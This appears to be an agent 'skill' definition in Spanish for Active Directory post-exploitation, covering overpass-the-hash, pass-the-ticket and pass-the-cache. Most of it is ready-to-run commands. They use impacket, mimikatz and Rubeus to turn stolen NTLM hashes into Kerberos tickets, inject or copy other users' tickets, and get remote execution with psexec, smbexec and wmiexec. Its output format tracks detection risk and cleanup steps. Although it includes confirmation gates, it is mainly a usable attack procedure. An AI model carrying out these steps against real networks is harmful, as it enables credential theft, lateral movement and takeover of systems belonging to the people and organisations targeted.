---
name: ad-overpass-pass-the-ticket
description: Convertir NTLM hash en TGT (overpass-the-hash), reutilizar tickets Kerberos (pass-the-ticket), reutilizar ccache (pass-the-cache)
phase: post
---

# Overpass-the-Hash / Pass-the-Ticket / Pass-the-Cache

## Activation Contract

**Cuando se usa:** Post-explotacion cuando se tiene un hash NTLM o un ticket Kerberos existente, y se necesita acceso a servicios que usan autenticacion Kerberos (no NTLM).

**Input requerido:**
- `ntlm_hash`: hash NTLM del usuario (para overpass)
- `username`: cuenta objetivo
- `domain`: dominio
- `dc_ip`: IP del Domain Controller (para solicitar TGT)
- `kirbi_file` o `ccache_file`: ticket existente (para pass-the-ticket/cache)

**Herramientas:** impacket-getTGT, impacket-getST, Rubeus, mimikatz, klist, KRB5CCNAME

## Hard Rules

1. Overpass-the-hash convierte un hash NTLM en un TGT valido — no requiere password
2. El TGT tiene validez limitada (usualmente 10 horas por defecto en AD)
3. Pass-the-ticket funciona contra servicios que usan Kerberos (no SMB por defecto)
4. Los tickets kirbi (Windows) y ccache (Linux) son intercambiables con conversion
5. NO reutilizar tickets sin verificar que el service account tiene acceso al recurso objetivo
6. Los tickets se cachean en memoria: `klist purge` los limpia

## Decision Gates

Preguntar antes de cada accion:

- **Overpass-the-hash**: "Convertir hash NTLM de `<user>` en TGT. Permite acceder a servicios Kerberos sin password. ?Proceder?"
- **Pass-the-ticket**: "Inyectar ticket existente en la sesion actual. ?Continuar?"
- **Pass-the-cache (Linux)**: "Reutilizar ccache de Kerberos. ?Ejecutar?"
- **Usar Rubeus**: "Requiere ejecutar Rubeus.exe en el host Windows. ?Autorizado?"

## Execution Steps

### 1. Overpass-the-Hash: NTLM → TGT

```bash
# Obtener TGT usando hash NTLM
impacket-getTGT <domain>/<username> -hashes <LM:NT> -dc-ip <dc_ip>

# Exportar ticket para usarlo
export KRB5CCNAME=/path/to/<username>.ccache
```

### 2. Usar el TGT para acceder a servicios

```bash
# Acceso a SMB via Kerberos (impacket)
impacket-smbexec <domain>/<username>@<target_hostname.domain.local> -k -no-pass

# Acceso a WinRM
impacket-wmiexec <domain>/<username>@<target_hostname.domain.local> -k -no-pass
```

**Importante:** Usar FQDN del target, no IP. Kerberos requiere resolucion de nombre.

### 3. Pass-the-Ticket (Windows)

```powershell
# mimikatz: inyectar ticket en memoria
mimikatz "kerberos::ptt <ticket.kirbi>" exit

# Rubeus
Rubeus.exe asktgt /user:<username> /rc4:<ntlm_hash> /ptt
Rubeus.exe ptt /ticket:<base64_ticket>

# Verificar tickets cargados
klist
```

### 4. Pass-the-Cache (Linux)

```bash
# Copiar ccache de otro usuario (requiere root o acceso al archivo)
cp /tmp/krb5cc_<uid> /tmp/krb5cc_<our_uid>
export KRB5CCNAME=/tmp/krb5cc_<our_uid>

# Verificar
klist
impacket-smbexec <domain>/<user>@<target> -k -no-pass
```

### 5. Convertir entre formatos

```bash
# ccache → kirbi (Linux → Windows)
impacket-ticketConverter /tmp/ticket.ccache /tmp/ticket.kirbi

# kirbi → ccache (Windows → Linux)
impacket-ticketConverter /tmp/ticket.kirbi /tmp/ticket.ccache
```

### 6. Rubeus — overpass con comodidad

```powershell
# Rubeus: asktgt + inyectar automaticamente
Rubeus.exe asktgt /user:<username> /rc4:<ntlm_hash> /ptt /domain:<domain> /dc:<dc_ip>

# Rubeus: renew ticket (evitar expiracion)
Rubeus.exe renew /ticket:<base64_ticket> /ptt
```

### 7. Verificar acceso

```bash
# Probar autenticacion contra un recurso
impacket-psexec <domain>/<user>@<target.domain.local> -k -no-pass

# Comprobar si el ticket funciona (sin ejecutar comando)
impacket-smbclient <domain>/<user>@<target.domain.local> -k -no-pass -list
```

## Output Contract

```json
{
  "skill": "ad-overpass-pass-the-ticket",
  "phase": "post",
  "domain": "domain.local",
  "username": "admin",
  "ntlm_hash_used": true,
  "tgt_obtained": true,
  "ticket_file": "/tmp/admin.ccache",
  "format": "ccache",
  "converted_to_kirbi": true,
  "targets_accessed": ["server01.domain.local", "sql01.domain.local"],
  "expiration": "2026-07-19T04:00:00Z",
  "detection_risk": "medium",
  "cleaning_steps": ["destroy ticket file", "klist purge"]
}
```
